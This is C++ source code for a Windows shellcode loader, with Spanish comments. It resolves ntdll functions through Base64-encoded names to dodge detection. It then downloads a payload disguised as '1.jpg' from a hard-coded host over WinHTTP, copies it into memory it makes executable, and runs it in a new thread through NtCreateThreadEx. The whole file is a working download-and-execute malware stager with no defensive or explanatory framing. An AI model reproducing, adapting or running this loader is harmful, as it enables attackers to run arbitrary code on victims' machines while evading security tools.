#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "winhttp.lib")

#define NtCurrentProcess() ((HANDLE)-1)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(WINAPI* _NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(WINAPI* _NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(WINAPI* _NtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

// Función para decodificar Base64
std::string Base64Decode(const std::string& encoded) {
    std::string decoded;
    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int in_len = encoded.size();
    int i = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || encoded[in_] == '+' || encoded[in_] == '/')) {
        char_array_4[i++] = encoded[in_];
        in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) decoded += char_array_3[i];
            i = 0;
        }
    }
    if (i) {
        for (int j = i; j < 4; j++) char_array_4[j] = 0;
        for (int j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        for (int j = 0; j < i - 1; j++) decoded += char_array_3[j];
    }
    return decoded;
}

// Función para convertir std::string a std::wstring
std::wstring StringToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

// Cargar funciones de ntdll manualmente, pero cargando ntdll.dll sin codificar
HMODULE LoadNTDLLFunctions(_NtAllocateVirtualMemory& NtAllocateVirtualMemory, _NtProtectVirtualMemory& NtProtectVirtualMemory, _NtCreateThreadEx& NtCreateThreadEx, _NtWaitForSingleObject& NtWaitForSingleObject) {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll"); // Cargando directamente ntdll.dll sin Base64
    if (hNtdll) {
        std::cout << "[+] ntdll.dll cargado correctamente\n";

        NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, Base64Decode("TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=").c_str());
        if (!NtAllocateVirtualMemory) std::cerr << "[-] Error al cargar NtAllocateVirtualMemory\n";

        NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtdll, Base64Decode("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==").c_str());
        if (!NtProtectVirtualMemory) std::cerr << "[-] Error al cargar NtProtectVirtualMemory\n";

        NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, Base64Decode("TnRDcmVhdGVUaHJlYWRFeA==").c_str());
        if (!NtCreateThreadEx) std::cerr << "[-] Error al cargar NtCreateThreadEx\n";

        NtWaitForSingleObject = (_NtWaitForSingleObject)GetProcAddress(hNtdll, Base64Decode("TnRXYWl0Rm9yU2luZ2xlT2JqZWN0").c_str());
        if (!NtWaitForSingleObject) std::cerr << "[-] Error al cargar NtWaitForSingleObject\n";

        if (NtAllocateVirtualMemory && NtProtectVirtualMemory && NtCreateThreadEx && NtWaitForSingleObject) {
            std::cout << "[+] Todas las funciones se cargaron correctamente\n";
            return hNtdll;
        }
        else {
            std::cerr << "[-] Error: No se pudieron cargar todas las funciones necesarias\n";
        }
    }
    else {
        std::cerr << "[-] Error: No se pudo cargar ntdll.dll\n";
    }
    return NULL;
}

// Cerrar handles de red
void CloseHandles(HINTERNET hRequest, HINTERNET hConnect, HINTERNET hSession) {
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// Descargar el código desde un servidor utilizando WinHTTP
std::vector<BYTE> DownloadCode(LPCWSTR serverName, LPCWSTR objectName) {
    std::wstring programStr = StringToWString(Base64Decode("QSBQcm9ncmFt")); // "A Program"
    std::wstring methodStr = StringToWString(Base64Decode("R0VU")); // "GET"

    HINTERNET hSession = WinHttpOpen(programStr.c_str(), WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return {};

    HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return {};
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, methodStr.c_str(), objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        CloseHandles(hRequest, hConnect, hSession);
        return {};
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
        CloseHandles(hRequest, hConnect, hSession);
        return {};
    }

    std::vector<BYTE> buffer;
    DWORD dwSize = 0, dwDownloaded = 0;

    do {
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            std::vector<BYTE> tempBuffer(dwSize);
            WinHttpReadData(hRequest, tempBuffer.data(), dwSize, &dwDownloaded);
            buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
        }
    } while (dwSize > 0);

    CloseHandles(hRequest, hConnect, hSession);

    return buffer;
}

// Ejecutar el código descargado
bool ExecuteCode(PVOID BaseAddress, const std::vector<BYTE>& code, _NtAllocateVirtualMemory NtAllocateVirtualMemory, _NtProtectVirtualMemory NtProtectVirtualMemory, _NtCreateThreadEx NtCreateThreadEx, _NtWaitForSingleObject NtWaitForSingleObject) {
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    SIZE_T codeSize = code.size();
    DWORD OldProtect = 0;

    NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return false;

    memcpy(BaseAddress, code.data(), codeSize);
    status = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &codeSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(status)) return false;

    status = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) return false;

    return true;
}

int main() {
    std::wstring serverName = L"192.168.2.139";
    std::wstring objectName = L"/1.jpg";
    std::vector<BYTE> downloadedCode = DownloadCode(serverName.c_str(), objectName.c_str());

    if (downloadedCode.empty()) {
        std::cerr << "Error: Download failed.\n";
        return 1;
    }

    PVOID BaseAddress = NULL;
    _NtAllocateVirtualMemory NtAllocateVirtualMemory;
    _NtProtectVirtualMemory NtProtectVirtualMemory;
    _NtCreateThreadEx NtCreateThreadEx;
    _NtWaitForSingleObject NtWaitForSingleObject;

    HMODULE hNtdll = LoadNTDLLFunctions(NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject);
    if (!hNtdll) {
        std::cerr << "Error: Failed to load functions.\n";
        return 1;
    }

    if (!ExecuteCode(BaseAddress, downloadedCode, NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject)) {
        std::cerr << "Execution failed.\n";
        FreeLibrary(hNtdll);
        return 1;
    }

    std::cout << "[+] Código ejecutado en el hilo. Manteniendo el proceso activo...\n";
    while (true) {
        Sleep(1000); // Mantiene el proceso corriendo y revisa cada segundo
    }

    FreeLibrary(hNtdll);
    return 0;
}
